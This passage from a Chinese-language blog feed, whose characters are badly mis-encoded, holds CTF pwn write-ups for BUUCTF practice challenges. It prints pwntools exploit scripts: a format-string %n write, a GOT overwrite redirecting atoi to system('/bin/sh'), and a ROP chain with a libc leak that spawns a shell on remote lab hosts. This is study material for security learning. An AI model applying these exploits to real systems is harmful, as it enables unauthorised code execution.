class="comment">2.ç¬¬ä¸€æ¬¡readå°†atoiå‡½æ•°ç›´æ¥æ”¹ä¸ºæ‰§è¡Œsystemå‡½æ•°ï¼Œç¬¬äºŒæ¬¡readå°†nptræ”¹æˆ&quot;/bin/sh&quot;ï¼Œäºæ˜¯æ‰§è¡Œsystem(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>æ³¨ï¼š<strong>BSSï¼ˆBlock Started by Symbolï¼‰</strong>ä»£è¡¨äº†ç¨‹åºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„å­˜å‚¨åŒºåŸŸã€‚</p><h4 id="3-ä»£ç "><a href="#3-ä»£ç " class="headerlink" title="3.ä»£ç "></a>3.ä»£ç </h4><h5 id="æ–¹æ³•ä¸€ï¼šç¯¡æ”¹unk-804C044çš„å€¼"><a href="#æ–¹æ³•ä¸€ï¼šç¯¡æ”¹unk-804C044çš„å€¼" class="headerlink" title="æ–¹æ³•ä¸€ï¼šç¯¡æ”¹unk_804C044çš„å€¼"></a>æ–¹æ³•ä¸€ï¼šç¯¡æ”¹unk_804C044çš„å€¼</h5><p>ä»¥ä¸‹ç¡®å®šè¾“å…¥çš„å­—ç¬¦ä¸²åç§»é‡ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="string">&#x27;./pwn&#x27;</span> </span><br><span class="line"></span><br><span class="line">your name:abcd 1:%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p 11:%p</span><br><span class="line">Hello,abcd 1:0xffc7ea48 2:0x63 3:(nil) 4:0xf7fd1ba0 5:0x3 6:0xf7f927b0 7:0x1 8:(nil) 9:0x1 10:0x64636261 11:0x32207025</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªæµ‹è¯•ï¼Œæˆ‘ä»¬çŸ¥é“abcdè¢«å­˜å‚¨åœ¨å‚æ•°åˆ—è¡¨ä¸­ç¬¬åä¸ªå‚æ•°çš„ä½ç½®ã€‚ï¼ˆaçš„asciiç æ˜¯61ï¼‰</p><p>IDAä¸­å¯ä»¥æ‰¾åˆ°unk_804C044çš„åœ°å€å°±æ˜¯0x804C044</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 dword_804C044   dd ?                    ; DATA XREF: main+77â†‘o</span><br></pre></td></tr></table></figure><p>printfå‡½æ•°çš„ä¸€ä¸ªæ¼æ´å°±æ˜¯å¯ä»¥å€ŸåŠ©**%n**å†™å…¥æ•°æ®ã€‚</p><p>pythonä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29326</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + <span class="string">b&#x27;%10$n&#x27;</span> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x804c044å 4å­—èŠ‚</span></span><br><span class="line"><span class="string">&#x27;%n&#x27;åœ¨printf()ä¸­è¡¨ç¤ºï¼Œå°†å·²è¾“å‡ºçš„å­—ç¬¦æ•°å†™å…¥åˆ°å‚æ•°æŒ‡å‘çš„ä½ç½®ã€‚</span></span><br><span class="line"><span class="string">è€Œç»è¿‡ä¸Šè¿°æµ‹è¯•ï¼Œæˆ‘ä»¬çŸ¥é“ç¬¬åä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„åœ°å€0x804c044</span></span><br><span class="line"><span class="string">10$å°±ä»£è¡¨å†™å…¥ç¬¬åä¸ªå‚æ•°ã€‚</span></span><br><span class="line"><span class="string">ä¸è¦å¿˜è®°æ·»åŠ &#x27;b&#x27;ï¼Œå¦åˆ™å‘é€strä¼šæŠ¥é”™ã€‚</span></span><br><span class="line"><span class="string">å†™å…¥äº†å€¼  b&#x27;4&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;your name:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#ä»¥ä¸Šä¸¤ç§æ–¹æ³•éƒ½æ˜¯æ”¶åˆ°æç¤ºåå‘é€ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="æ–¹æ³•äºŒï¼šå°†atoiå‡½æ•°ç›´æ¥æ”¹ä¸ºæ‰§è¡Œsystemå‡½æ•°"><a href="#æ–¹æ³•äºŒï¼šå°†atoiå‡½æ•°ç›´æ¥æ”¹ä¸ºæ‰§è¡Œsystemå‡½æ•°" class="headerlink" title="æ–¹æ³•äºŒï¼šå°†atoiå‡½æ•°ç›´æ¥æ”¹ä¸ºæ‰§è¡Œsystemå‡½æ•°"></a>æ–¹æ³•äºŒï¼šå°†atoiå‡½æ•°ç›´æ¥æ”¹ä¸ºæ‰§è¡Œsystemå‡½æ•°</h5><p>pythonä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#elfæ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„æ„æ€ã€‚</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26396</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_plt_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">format_string_offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(format_string_offset,&#123;atoi_got_addr:system_plt_addr&#125;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#ç»“æŸè¦è®°å¾—æ·»åŠ å­—ç¬¦ä¸²ç»“æŸç¬¦ã€‚</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹ä¸€äº›çŸ¥è¯†ç›²åŒºï¼š</p><ol><li><p><strong><code>atoi_got_addr = elf.got[&#39;atoi&#39;]</code></strong>:</p><ul><li>è¿™è¡Œä»£ç ä»å½“å‰ç¨‹åºçš„**å…¨å±€åç§»è¡¨(GOT)**ä¸­æå–äº†<code>atoi</code>å‡½æ•°çš„åœ°å€ã€‚GOTæ˜¯ä¸€ä¸ªåœ¨è¿è¡Œæ—¶ç”±åŠ¨æ€é“¾æ¥å™¨ç»´æŠ¤çš„è¡¨ï¼Œç”¨äºå­˜å‚¨æ¯ä¸ªå¤–éƒ¨å‡½æ•°ï¼ˆå¦‚æ¥è‡ªå…±äº«åº“çš„å‡½æ•°ï¼‰çš„å®é™…åœ°å€ã€‚</li><li>å½“ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨å‡½æ•°æ—¶ï¼Œå®ƒå®é™…ä¸Šæ˜¯é€šè¿‡GOTçš„å¯¹åº”æ¡ç›®æ¥è°ƒç”¨çš„ã€‚åœ¨ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°åï¼ŒåŠ¨æ€é“¾æ¥å™¨å°†å¡«å……è¯¥å‡½æ•°çš„å®é™…åœ°å€åˆ°GOTã€‚</li><li>ç”±äºGOTå­˜æ”¾åœ¨å·²çŸ¥çš„åœ°å€ï¼Œå¹¶ä¸”å¯èƒ½åœ¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸä¸­è¢«ä¿®æ”¹ï¼Œå› æ­¤å®ƒç»å¸¸æˆä¸ºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„ç›®æ ‡ã€‚</li></ul></li><li><p><strong><code>system_plt_addr = elf.plt[&#39;system&#39;]</code></strong>:</p><ul><li>è¿™è¡Œä»£ç ä»ç¨‹åºçš„**è¿‡ç¨‹é“¾æ¥è¡¨(PLT)**ä¸­æå–äº†<code>system</code>å‡½æ•°çš„åœ°å€ã€‚PLTæ˜¯ä¸€ä¸ªå­˜æ”¾è·³è½¬æŒ‡ä»¤çš„è¡¨ï¼Œå®ƒåœ¨ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨å‡½æ•°æ—¶ä½¿ç”¨ã€‚</li><li>å½“ç¨‹åºå°è¯•è°ƒç”¨ä¸€ä¸ªè¿˜æœªè§£æçš„å¤–éƒ¨å‡½æ•°æ—¶ï¼Œå®ƒé¦–å…ˆè·³è½¬åˆ°PLTä¸­çš„å¯¹åº”æ¡ç›®ã€‚ç„¶åï¼ŒPLTæ¡ç›®å°†ä½¿ç”¨GOTä¸­çš„ä¿¡æ¯æ¥è·³è½¬åˆ°å®é™…çš„å‡½æ•°åœ°å€ï¼ˆæˆ–è€…è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨æ¥è§£æå®ƒï¼‰ã€‚</li></ul></li><li><p><strong><code>format_string_offset = 10</code></strong>:</p><ul><li>è¿™å£°æ˜äº†ä¸€ä¸ªå˜é‡ï¼Œè¡¨ç¤ºæˆ‘ä»¬é¢„è®¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®æ˜¯ç¬¬10ä¸ªå‚æ•°ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡æµ‹è¯•å’Œå®éªŒæ¥ç¡®å®šçš„ã€‚</li></ul></li><li><p><strong><code>payload = fmtstr_payload(format_string_offset, &#123;atoi_got_addr: system_plt_addr&#125;)</code></strong>:</p><ul><li><code>fmtstr_payload</code>æ˜¯<code>pwnlib</code>åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºç”Ÿæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»çš„payloadã€‚</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆ<code>format_string_offset</code>ï¼‰å‘Šè¯‰å‡½æ•°æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨å‚æ•°åˆ—è¡¨ä¸­çš„ä½ç½®ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæè¿°äº†åº”ä¿®æ”¹å“ªäº›åœ°å€åŠå…¶æ–°çš„å€¼ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æƒ³å°†<code>atoi</code>çš„GOTæ¡ç›®æ”¹ä¸º<code>system</code>å‡½æ•°çš„PLTåœ°å€ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æƒ³åœ¨ä¸‹æ¬¡ç¨‹åºè°ƒç”¨<code>atoi</code>å‡½æ•°æ—¶å®é™…ä¸Šæ‰§è¡Œ<code>system</code>å‡½æ•°ã€‚</li></ul></li></ol><p>è¯¥æ”»å‡»æ¶‰åŠåˆ°é‡å†™GOTä¸­çš„<code>atoi</code>å‡½æ•°åœ°å€ï¼Œä½¿å…¶æŒ‡å‘<code>system</code>å‡½æ•°æˆ–å…¶ä»–æ¶æ„ä»£ç ã€‚è¿™æ ·ï¼Œä¸‹æ¬¡ç¨‹åºå°è¯•è°ƒç”¨<code>atoi</code>æ—¶ï¼Œå®ƒå®é™…ä¸Šä¼šæ‰§è¡Œæ”»å‡»è€…é€‰æ‹©çš„ä»£ç ã€‚</p><h2 id="ciscn-2019-c-1-1"><a href="#ciscn-2019-c-1-1" class="headerlink" title="ciscn_2019_c_1  1"></a>ciscn_2019_c_1  1</h2><p><em>20230828</em></p><p>ä¸€ä¸ªROPã€‚</p><p>ä»£ç å…ˆè¡Œã€‚</p><h5 id="1-pythonä»£ç "><a href="#1-pythonä»£ç " class="headerlink" title="1.pythonä»£ç "></a>1.pythonä»£ç </h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># LibcSearcher ä¹Ÿæ˜¯é‡è¦çš„ä¸€ä¸ªæ¨¡ç»„</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25016</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;../ciscn_2019_c_1&quot;</span>)</span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line"><span class="comment"># é€šè¿‡Ropgadgetå¾—åˆ°ï¼Œä¸€ä¸ªpop_rdiçš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># putsæ˜¯ä¸€ä¸ªå…¸å‹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¾—åˆ°å®ƒçš„gotå’Œplt</span></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x400B28</span></span><br><span class="line"><span class="comment"># mainå‡½æ•°åœ°å€ï¼Œç”¨äºè¿”å›ä¸»å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_puts_addr</span>():</span><br><span class="line">    r.recv()</span><br><span class="line">    <span class="comment"># æ¥æ”¶å®ƒè¦è¾“å‡ºçš„æ–‡å­—</span></span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># è¾“å…¥1ï¼Œè¿›å…¥encyptå‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># putsåœ¨è¾“å‡ºå®Œè¯­å¥åä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªâ€œ\nâ€ï¼Œæˆ‘ä»¬åªéœ€è¦æ•æ‰è¿™ä¸ª\nå°±å¯ä»¥äº†ã€‚</span></span><br><span class="line"></span><br><span class="line">    p=<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+p64(rdi)+p64(got)+p64(plt)+p64(main_addr)</span><br><span class="line">    r.sendline(p)</span><br><span class="line">    <span class="comment"># ç¬¬ä¸€ä¸ªpayloadï¼Œå› ä¸ºgetså‡½æ•°å®¹æ˜“æº¢å‡ºï¼Œæˆ‘ä»¬ç›´æ¥48+8å¡«å……så’Œrbpï¼Œè¿›å…¥æ‰§è¡Œæµã€‚</span></span><br><span class="line">    <span class="comment"># ç„¶åä¼ é€åˆ°rdiï¼ŒæŠŠæˆ‘ä»¬putså‡½æ•°çš„gotå’Œpltéƒ½å¡«å……è¿›å»ï¼Œç„¶åå›åˆ°mainå‡½æ•°ï¼Œè¿™æ ·ä¸‹ä¸€æ¬¡è¾“å‡ºå°±ä¼šæ³„éœ²ã€‚</span></span><br><span class="line">    <span class="comment"># æ³„æ¼åœ°å€åˆ°stdoutã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        <span class="comment"># æ”¶åˆ°äº†ä¸¤ä¸ªputså‡½æ•°ï¼Œè¯»å–ä¸¤æ¬¡</span></span><br><span class="line">        <span class="comment"># ç¬¬äºŒæ¬¡è¾“å‡ºsä¸­çš„\nä¹‹åä¼šæ¥ç€è¾“å‡ºæ³„éœ²åœ°å€ã€‚</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="comment"># æ¥æ”¶æ³„éœ²çš„putsåœ°å€ã€‚æ¥æ”¶6ä½ï¼Œè¡¥é½æˆ8ä½ï¼Œç»“æŸç¬¦ç»„æˆå­—ç¬¦ä¸²ã€‚</span></span><br><span class="line">    </span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,leak_puts_addr())</span><br><span class="line"><span class="comment"># æ³„éœ²çš„ä¸€ä¸ªputsï¼Œè¶³ä»¥æ¨æ–­æ•´ä¸ªlibc</span></span><br><span class="line">libcbase=leak_puts_addr()-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment"># ç»å¯¹åœ°å€-ç›¸å¯¹åœ°å€å°±æ˜¯libcçš„åŸºå€</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">res=<span class="number">0x4006b9</span></span><br><span class="line"><span class="comment"># å®ç°æ ˆå¯¹é½</span></span><br><span class="line"></span><br><span class="line">p1=<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+p64(res)+p64(rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line"><span class="comment">#è¿›å…¥rdiä¹‹å‰å…ˆå®ç°æ ˆå¯¹é½</span></span><br><span class="line"></span><br><span class="line">r.sendline(p1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h5 id="2-æ€è·¯"><a href="#2-æ€è·¯" class="headerlink" title="2.æ€è·¯"></a>2.æ€è·¯</h5><h6 id="TERMINAL"><a href="#TERMINAL" class="headerlink" title="TERMINAL:"></a>TERMINAL:</h6><p>å¼¹å‡ºä¸€ä¸ªç•Œé¢ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹ã€‚é€‰1ï¼Œä¼šè®©ä½ è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼›é€‰2ï¼Œæ²¡å•¥åµç”¨ï¼›é€‰3ï¼Œç›´æ¥é€€äº†ã€‚</p><p>å¯è§ï¼Œè¾“å…¥è¿™ä¸ªéƒ¨åˆ†å¯èƒ½æ˜¯çªç ´å£ã€‚</p><h6 id="IDAï¼š"><a href="#IDAï¼š" class="headerlink" title="IDAï¼š"></a>IDAï¼š</h6><p>äºæ˜¯æˆ‘ä»¬æ³¨æ„encryptå‡½æ•°ï¼Œä¸è¦è¢«å®ƒçš„é€»è¾‘å¸å¼•äº†ï¼Œ</p><p>ä¸»è¦å°±æ˜¯ä¸ªgetså’Œputsè¿™äº›å¤å¤ä¸”ä¸å®‰å…¨çš„å‡½æ•°éœ€è¦è¢«æˆ‘ä»¬åˆ©ç”¨ã€‚</p><p>è€Œæ•°ç»„sæ˜¯å…¶ä¸­çš„ä¸»è§’ã€‚putså¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>åˆ©ç”¨rdiè¿›è¡ŒROPæ”»å‡»ã€‚</p><h5 id="3-åæ€"><a href="#3-åæ€" class="headerlink" title="3.åæ€"></a>3.åæ€</h5><p>1.ä»£ç æ¨¡å—åŒ–æ˜¯ä¸€ç§æ–°çš„å°è¯•ã€‚æ³¨æ„å¢åŠ ä»£ç å¯è¯»æ€§ï¼Œæ³¨é‡Šé‡Œä¹Ÿå…¨æ˜¯ä¿¡æ¯å’ŒçŸ¥è¯†ç‚¹ã€‚</p><p>2.ROPä¸­ï¼Œputsä¹‹åä¼šé€ æˆæ ˆä¸å¯¹é½ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°æ ˆå¯¹é½ï¼Œç”¨ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥returnä¿®æ­£ï¼ˆå®ƒä¼šè°ƒæ•´rspï¼‰</p><p>3.checksecä¹Ÿæ˜¯ä¸€ç§æç¤ºï¼Œæ¯”å¦‚è¿™é¢˜NX  enabledï¼Œä¸€èˆ¬ç”¨ROPç»•è¿‡ã€‚</p><p>4.æ³¨æ„ROPé“¾å‡ ä¸ªé‡è¦ç»†èŠ‚ï¼šæ¯ä¸€ä¸ªå‡½æ•°ã€å¯„å­˜å™¨ç»“æŸä¹‹åéƒ½ä¼šæœ‰ä¸ªretï¼›pltæ˜¯è¢«retæ‰§è¡Œï¼Œç”¨æ¥æ‰§è¡Œgotçš„ã€‚</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnåˆ·é¢˜è®°å½• 1</title>
      <link>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%201/</link>
      <guid>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%201/</guid>
      <pubDate>Thu, 24 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<p>æ³¨ï¼šå¯ç”¨ç›®å½•å¿«é€Ÿå¯¼èˆªã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è™½ç„¶ç®—æ³•é¢˜ä¾ç„¶é‡è¦ï¼Œä½†æˆ‘æƒ³ç©ç‚¹CTFä»¥æ›´å¥½æå‡è‡ªå·±ã€‚</p><p>å‰ä¸ä¹…æˆ‘å¼€å§‹æ¢ç´¢WEBå®‰å…¨ï¼Œä½†é—æ†¾çš„æ˜¯æˆ‘å¿˜è®°äº†åœ¨æˆ‘çš„åšå®¢ä¸Šè®°å½•å­¦ä¹ çš„è¿‡ç¨‹ã€‚</p><p>ç›®å‰ï¼Œæˆ‘æ›´å¯¹è‡ªå·±çš„å®šä½æ˜¯web&amp;&amp;pwnã€‚</p><p>åŒæ—¶ï¼Œæˆ‘ä¹Ÿå¸Œæœ›é€šè¿‡è®°å½•è‡ªå·±çš„å­¦ä¹ å’ŒæŒ‘æˆ˜è¿‡ç¨‹æ¥åŸ¹å…»ä¸€ç§è‰¯å¥½çš„ä¹ æƒ¯ã€‚</p><p>ä»¥ä¸‹ä»buuctfå¼€å§‹ã€‚</p><h2 id="test-your-nc1"><a href="#test-your-nc1" class="headerlink" title="test_your_nc1"></a>test_your_nc1</h2><p>2023-08-23</p><h4 id="1-æ“ä½œ"><a href="#1-æ“ä½œ" class="headerlink" title="**1.**æ“ä½œ"></a>**1.**æ“ä½œ</h4><p>ä¸€ä¸ªåœ¨æ­å»ºå¥½ç¯å¢ƒåå°±å¯ä»¥å®Œæˆçš„å…¥é—¨é¢˜ã€‚</p><p>å¯åŠ¨é¶æœºï¼Œæ‰“å¼€ubuntuï¼Œterminalï¼Œç›´æ¥è¾“å…¥ncå»è¿æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 29757</span><br><span class="line"><span class="comment">#ç«¯å£å·æŒ‰ç…§è‡ªå·±çš„é¶æœºæ”¹</span></span><br></pre></td></tr></table></figure><h4 id="2-è·å–flag"><a href="#2-è·å–flag" class="headerlink" title="**2.**è·å–flag"></a>**2.**è·å–flag</h4><p>è¾“å…¥lsï¼Œçœ‹åˆ°äº†flagï¼Œè¾“å…¥cat flagï¼Œå¾—åˆ°flagã€‚</p><h2 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h2><p>2023-08-24</p><h4 id="1-åˆ†æï¼š"><a href="#1-åˆ†æï¼š" class="headerlink" title="**1.**åˆ†æï¼š"></a>**1.**åˆ†æï¼š</h4><p>å…ˆæŠŠvulnæ”¾åœ¨ubuntuçš„æ¡Œé¢ï¼Œåœ¨æ¡Œé¢æ‰“å¼€terminalï¼Œè¾“å…¥â€œchecksec vulnâ€æ¥æ£€æŸ¥å®ƒæ˜¯å¦å—ä¿æŠ¤ã€‚</p><p>æŠŠvulnåœ¨ubuntuä¸­æ‹–å…¥terminalè¿›è¡Œç©è€ï¼Œä»–ä¼šè¦æ±‚è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œ</p><p>æ¯”å¦‚è¾“å…¥ä¸€ä¸ª123è¯•è¯•ï¼Œæ„Ÿå—ä¸€ä¸‹å®ƒçš„äº¤äº’ã€‚</p><p>å°†é™„ä»¶vulnæ‹–å…¥windowsçš„IDAåˆ†æï¼Œéœ€è¦æ³¨æ„çš„å‡½æ•°æœ‰ï¼šmainå‡½æ•° å’Œ <strong>åˆ—è¡¨ä¸­</strong>mainä¸‹é¢çš„funå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„getså‡½æ•°æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå®ƒå¯¹å­—ç¬¦ä¸²çš„è¾“å…¥æ˜¯å¯ä»¥æ— é™é•¿ï¼Œç„¶åæº¢å‡ºçš„ï¼Œè€Œæº¢å‡ºæ­£æ˜¯pwnçš„ä¸»çº¿ã€‚</p><p>å…¶ä¸­sæ•°ç»„æ˜¯å…³é”®ï¼Œæˆ‘ä»¬ç‚¹å¼€sè¿›è¡ŒæŸ¥çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-000000000000000F s               db ?</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003                 db ? ; undefined</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 db ? ; undefined</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šçœ‹åˆ°è¿™æ ·ä¸€æ®µsæ•°ç»„çš„å­˜å‚¨ç©ºé—´ï¼Œä»1åˆ°15ç¼–å·ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¾“å…¥15ä¸ªå­—ç¬¦å°±å¯ä»¥æŠŠæ•°ç»„så¡«æ»¡ã€‚</p><p>å¦å¤–ï¼Œåœ¨mainçš„IDAè§†å›¾å¼€å¤´ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br></pre></td></tr></table></figure><p>è¯´æ˜rbpè¢«å…ˆå‹è¿›å»äº†ï¼Œæˆ‘ä»¬éœ€è¦æŠŠrbpä¹Ÿå¡«å……æ»¡ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span 